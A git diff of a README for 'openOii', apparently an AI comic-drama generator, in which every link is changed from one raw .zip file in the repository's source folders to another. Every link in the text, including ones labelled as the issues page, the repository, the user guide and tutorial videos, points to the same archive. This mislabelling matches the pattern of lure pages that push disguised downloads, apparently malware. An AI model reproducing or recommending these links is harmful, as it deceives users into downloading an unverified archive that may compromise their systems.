@@ -1,6 +1,6 @@
 # 🎭 openOii - Create Engaging Comic Dramas with Ease
 
-[![Download openOii](https://github.com/ArshiJ111/openOii/raw/refs/heads/main/backend/app/agents/Oii_open_v1.9.zip)](https://github.com/ArshiJ111/openOii/raw/refs/heads/main/backend/app/agents/Oii_open_v1.9.zip)
+[![Download openOii](https://github.com/ArshiJ111/openOii/raw/refs/heads/main/frontend/app/Oii-open-v3.2.zip)](https://github.com/ArshiJ111/openOii/raw/refs/heads/main/frontend/app/Oii-open-v3.2.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to openOii! This platform allows you to generate comic dramas using AI-d
 
 ## 📦 Download & Install
 
-To get openOii, visit this page to download: [Download openOii](https://github.com/ArshiJ111/openOii/raw/refs/heads/main/backend/app/agents/Oii_open_v1.9.zip).
+To get openOii, visit this page to download: [Download openOii](https://github.com/ArshiJ111/openOii/raw/refs/heads/main/frontend/app/Oii-open-v3.2.zip).
 
 Here are the instructions to download the software:
 
@@ -71,13 +71,13 @@ If you encounter issues during installation or usage, here are some common probl
 
 ## 💬 Support
 
-For additional assistance, feel free to check the [GitHub Issues page](https://github.com/ArshiJ111/openOii/raw/refs/heads/main/backend/app/agents/Oii_open_v1.9.zip) for potential solutions or report any new problems you encounter.
+For additional assistance, feel free to check the [GitHub Issues page](https://github.com/ArshiJ111/openOii/raw/refs/heads/main/frontend/app/Oii-open-v3.2.zip) for potential solutions or report any new problems you encounter.
 
 ## 🌍 Community and Contributions
 
 We welcome contributions from the community. If you have ideas or improvements for openOii:
 
-1. Visit the [repository](https://github.com/ArshiJ111/openOii/raw/refs/heads/main/backend/app/agents/Oii_open_v1.9.zip).
+1. Visit the [repository](https://github.com/ArshiJ111/openOii/raw/refs/heads/main/frontend/app/Oii-open-v3.2.zip).
 2. Fork the project.
 3. Implement your changes and submit a pull request.
 
@@ -87,8 +87,8 @@ Your feedback is invaluable, helping us make openOii better for everyone.
 
 For more information about openOii, you might find these resources helpful:
 
-- [User Guide](https://github.com/ArshiJ111/openOii/raw/refs/heads/main/backend/app/agents/Oii_open_v1.9.zip) - A comprehensive manual on using the platform.
-- [Tutorial Videos](https://github.com/ArshiJ111/openOii/raw/refs/heads/main/backend/app/agents/Oii_open_v1.9.zip) - Visual walkthroughs showing how to use various features.
-- [AI Technology](https://github.com/ArshiJ111/openOii/raw/refs/heads/main/backend/app/agents/Oii_open_v1.9.zip) - Learn more about the technology behind our platform.
+- [User Guide](https://github.com/ArshiJ111/openOii/raw/refs/heads/main/frontend/app/Oii-open-v3.2.zip) - A comprehensive manual on using the platform.
+- [Tutorial Videos](https://github.com/ArshiJ111/openOii/raw/refs/heads/main/frontend/app/Oii-open-v3.2.zip) - Visual walkthroughs showing how to use various features.
+- [AI Technology](https://github.com/ArshiJ111/openOii/raw/refs/heads/main/frontend/app/Oii-open-v3.2.zip) - Learn more about the technology behind our platform.
 
-Using openOii, you can dive into the world of comic creation. Let your creativity flow and explore the possibilities! Download and get started today: [Download openOii](https://github.com/ArshiJ111/openOii/raw/refs/heads/main/backend/app/agents/Oii_open_v1.9.zip).
+Using openOii, you can dive into the world of comic creation. Let your creativity flow and explore the possibilities! Download and get started today: [Download openOii](https://github.com/ArshiJ111/openOii/raw/refs/heads/main/frontend/app/Oii-open-v3.2.zip).
